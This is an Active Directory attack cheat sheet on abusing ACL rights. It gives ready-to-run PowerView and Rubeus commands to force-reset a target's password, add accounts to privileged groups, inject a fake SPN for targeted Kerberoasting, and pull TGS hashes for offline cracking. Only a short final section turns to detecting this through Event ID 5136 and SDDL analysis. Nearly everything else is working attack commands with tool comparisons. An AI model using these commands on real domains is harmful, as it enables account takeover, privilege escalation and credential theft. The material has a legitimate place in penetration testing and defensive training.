## Force Password Change via PowerView

When you control a user with permissions to reset a target's password and need to pivot to that account.

1. Create a credential object for the account you currently control

```
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
```

2. Create a secure string for the new password to be assigned to the target

```
$TargetPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

3. Execute the password reset

```
Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $TargetPassword -Credential $Cred -Verbose
```

Tool comparison

- PowerView -> `Set-DomainUserPassword` -> Preferred for native execution on Windows targets
- pth-toolkit -> `pth-net` -> Preferred for execution from Linux attack hosts

Gotchas **Missing -Verbose flag** prevents receiving confirmation of success or detailed error data required for troubleshooting.

## Group Membership Modification

When a controlled account has rights to modify group membership to escalate privileges or inherit rights via **nested group membership**.

Check current group members to confirm current state

```
Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select MemberName
```

Alternative check using AD module

```
Get-ADGroup -Identity "<GROUP_NAME>" -Properties * | Select -ExpandProperty Members
```

Add a user to the target group

```
Add-DomainGroupMember -Identity '<GROUP_NAME>' -Members '<USERNAME>' -Credential $Cred -Verbose
```

Remove a user from the group during cleanup

```
Remove-DomainGroupMember -Identity "<GROUP_NAME>" -Members '<USERNAME>' -Credential $Cred -Verbose
```

Tool comparison

- PowerView -> `Add-DomainGroupMember` -> Standard Windows-based membership modification
- pth-toolkit -> `pth-net` -> Linux-based alternative for group modification

Gotchas **Removing the user before clearing attributes** like a fake SPN will result in losing the permissions required to finish cleanup.

## Targeted Kerberoasting via SPN Injection

When you have **GenericAll** or **GenericWrite** rights over an account and want to obtain a crackable hash without changing the user's password.

Inject a fake SPN into the target object

```
Set-DomainObject -Credential $Cred -Identity <USERNAME> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Remove the fake SPN after the hash is captured

```
Set-DomainObject -Credential $Cred -Identity <USERNAME> -Clear serviceprincipalname -Verbose
```

Tool comparison

- PowerView -> `Set-DomainObject` -> Manual attribute modification
- targetedKerberoast -> `targetedKerberoast` -> Preferred on Linux to automate SPN creation, hash retrieval, and cleanup in one command

Dangerous / misconfigured settings

- **GenericAll** rights on high-privilege users or service accounts
- **GenericWrite** rights on high-privilege users or service accounts

Gotchas **Service interruption** is avoided by using this method instead of a password reset for admin accounts.

## Kerberoasting with Rubeus

When an account has a **servicePrincipalName** set and you need to retrieve a TGS ticket for offline cracking.

Request the TGS and return the hash for the specified user

```
.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap
```

Gotchas **AES-enabled accounts** return AES hashes by default; use `/ticket:X` or `/tgtdeleg` to force **RC4_HMAC** if the cracker does not support AES.

## SDDL Analysis for Detection

When investigating **Event ID 5136** to identify which specific rights were granted during a suspected ACL abuse attempt.

Convert the raw SDDL string from the event log into a readable object

```
ConvertFrom-SddlString "<SDDL_STRING>"
```

Filter for the **DiscretionaryAcl** to see specific permissions granted

```
ConvertFrom-SddlString "<SDDL_STRING>" | select -ExpandProperty DiscretionaryAcl
```

Edge cases

- **GenericWrite** privileges over the domain object itself can indicate a high-level compromise attempt.

Gotchas **SDDL strings** are not human-readable in the raw Event Viewer output and require conversion for analysis.